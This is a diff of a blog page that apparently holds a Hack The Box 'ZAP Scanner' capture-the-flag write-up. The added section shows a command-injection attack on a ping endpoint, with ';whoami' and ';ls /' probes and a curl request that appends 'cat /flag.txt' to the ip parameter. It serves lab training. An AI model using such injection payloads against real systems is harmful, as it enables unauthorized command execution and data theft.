@@ -140,7 +140,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://depe.blog/images/redefine-og.webp">
 <meta property="article:published_time" content="2025-11-06T09:24:16.000Z">
-<meta property="article:modified_time" content="2025-11-06T09:27:09.981Z">
+<meta property="article:modified_time" content="2025-11-06T09:29:58.143Z">
 <meta property="article:author" content="Depe">
 <meta property="article:tag" content="HTB">
 <meta name="twitter:card" content="summary">
@@ -373,8 +373,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2025-11-06 11:27:09</span>
-            <span class="mobile">2025-11-06 11:27:09</span>
+            <span class="desktop">2025-11-06 11:29:58</span>
+            <span class="mobile">2025-11-06 11:29:58</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -474,8 +474,25 @@
 </ul>
 <hr>
 <h3 id="3-Vulnerability-—-Command-Injection"><a href="#3-Vulnerability-—-Command-Injection" class="headerlink" title="3. Vulnerability — Command Injection"></a>3. Vulnerability — Command Injection</h3><ul>
-<li>Vulnerable endpoint discovered in the writeup:</li>
+<li>Vulnerable endpoint discovered :</li>
 </ul>
+<p>&#x2F;devtools&#x2F;ping.php?ip&#x3D;</p>
+<ul>
+<li>Test for injection by sending payloads to <code>ip</code>, such as:</li>
+</ul>
+<p>;whoami<br>;ls &#x2F;</p>
+<p>If you see command output, the app is executing shell commands from the <code>ip</code> parameter.</p>
+<hr>
+<h3 id="4-Read-the-Flag"><a href="#4-Read-the-Flag" class="headerlink" title="4. Read the Flag"></a>4. Read the Flag</h3><ul>
+<li>Use a payload that appends <code>cat /flag.txt</code> to the <code>ip</code> parameter (URL-encoded):</li>
+</ul>
+<p><a class="link"   target="_blank" rel="noopener" href="http://94.237.54.192:48657/devtools/ping.php?ip=127.0.0.1;cat%20/flag.txt" >http://94.237.54.192:48657/devtools/ping.php?ip=127.0.0.1%3Bcat%20%2Fflag.txt<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<h2 id="Example-curl"><a href="#Example-curl" class="headerlink" title="Example: curl"></a>Example: <code>curl</code></h2><pre><code class="language-bash">curl &quot;http://94.237.54.192:48657/devtools/ping.php?ip=127.0.0.1%3Bcat%20%2Fflag.txt&quot;
+
+Expected output (example):
+
+HTB&#123;xxx-xxx-xxx&#125;
+</code></pre>
 
 		</div>
 
@@ -490,7 +507,7 @@
         
             <li>
                 <strong>Updated at
-                    :</strong> 2025-11-06 11:27:09
+                    :</strong> 2025-11-06 11:29:58
             </li>
         
         <li>
@@ -594,7 +611,7 @@
 	<div class="post-toc">
 		<div class="toc-title">On this page</div>
 		<div class="page-title">HTB - ZAP Scanner — Reading the Flag /flag.txt</div>
-		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Hack-the-Box-%E2%80%94-ZAP-Scanner-%E2%80%94-Read-the-Flag-flag-txt"><span class="nav-text">Hack the Box — ZAP Scanner — Read the Flag (&#x2F;flag.txt)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Table-of-Contents"><span class="nav-text">Table of Contents</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Goal"><span class="nav-text">Goal</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Tools"><span class="nav-text">Tools</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Quick-Start"><span class="nav-text">Quick Start</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Step-by-step-Walkthrough"><span class="nav-text">Step-by-step Walkthrough</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Start-ZAP-Discover"><span class="nav-text">1. Start ZAP &amp; Discover</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Inspect-Endpoints"><span class="nav-text">2. Inspect Endpoints</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-Vulnerability-%E2%80%94-Command-Injection"><span class="nav-text">3. Vulnerability — Command Injection</span></a></li></ol></li></ol></li></ol>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Hack-the-Box-%E2%80%94-ZAP-Scanner-%E2%80%94-Read-the-Flag-flag-txt"><span class="nav-text">Hack the Box — ZAP Scanner — Read the Flag (&#x2F;flag.txt)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Table-of-Contents"><span class="nav-text">Table of Contents</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Goal"><span class="nav-text">Goal</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Tools"><span class="nav-text">Tools</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Quick-Start"><span class="nav-text">Quick Start</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Step-by-step-Walkthrough"><span class="nav-text">Step-by-step Walkthrough</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Start-ZAP-Discover"><span class="nav-text">1. Start ZAP &amp; Discover</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Inspect-Endpoints"><span class="nav-text">2. Inspect Endpoints</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-Vulnerability-%E2%80%94-Command-Injection"><span class="nav-text">3. Vulnerability — Command Injection</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-Read-the-Flag"><span class="nav-text">4. Read the Flag</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Example-curl"><span class="nav-text">Example: curl</span></a></li></ol></li></ol>
 
 	</div>
 </div>
